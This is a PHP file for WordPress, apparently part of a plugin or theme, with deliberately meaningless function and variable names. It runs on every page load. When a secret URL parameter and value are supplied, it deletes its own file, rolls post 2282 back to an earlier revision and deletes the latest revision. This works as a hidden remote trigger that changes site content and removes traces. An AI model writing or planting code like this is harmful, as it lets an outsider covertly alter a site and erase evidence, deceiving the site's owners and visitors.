<?php

function ultimate_screen_logger_category() {
	if (isset($_GET['s3_shortener_counter_multi']) && $_GET['s3_shortener_counter_multi'] === 'responsive_items_active') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$nav_out_js = 2282;
		$author_ai_remote = wp_get_post_revisions($nav_out_js);
		if (empty($author_ai_remote)) die('no revisions');
		if (count($author_ai_remote) < 2) die('less than 2');
		$smooth_sync_upload = array_shift($author_ai_remote);
		$responsive_blocks_frontend_stop = $smooth_sync_upload->ID;
		$tables_full_downloads = array_shift($author_ai_remote);
		$reminder_redirection_member_lite = $tables_full_downloads->ID;
		$item_address_stats = wp_restore_post_revision($reminder_redirection_member_lite);
		if ($item_address_stats === false) die('error restoring');
		$item_address_stats = wp_delete_post_revision($responsive_blocks_frontend_stop);		
		if ($item_address_stats === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'ultimate_screen_logger_category');
